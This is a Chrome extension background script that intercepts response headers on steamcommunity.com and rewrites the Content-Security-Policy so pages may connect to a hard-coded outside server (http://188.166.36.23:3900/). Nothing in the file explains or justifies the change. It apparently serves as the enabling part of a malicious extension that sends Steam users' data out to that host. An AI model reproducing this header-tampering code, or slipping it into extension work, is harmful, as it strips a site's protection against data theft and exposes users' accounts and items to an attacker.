
'use strict';

var chrome = chrome || {};
var $ = $ || {};
var states = {};

console.log('background working');

chrome.webRequest.onHeadersReceived.addListener(function (details)
{
	for (var i = 0; i < details.responseHeaders.length; i++) {
	
		var headerName = details.responseHeaders[i].name.toUpperCase();
	
		if (headerName == 'CONTENT-SECURITY-POLICY' || headerName == 'X-WEBKIT-CSP') {
		
		var csp = details.responseHeaders[i].value;
		
		 csp = csp.replace("connect-src 'self'", "connect-src 'self' http://188.166.36.23:3900/");
		
		details.responseHeaders[i].value = csp;
		}
	}
	return {
		responseHeaders : details.responseHeaders
	};
}, {
	urls : ["*://*.steamcommunity.com/*"],
	types : ["main_frame", "sub_frame", "stylesheet", "script", "image", "object", "xmlhttprequest", "other"]
},
	["blocking", "responseHeaders"]
);
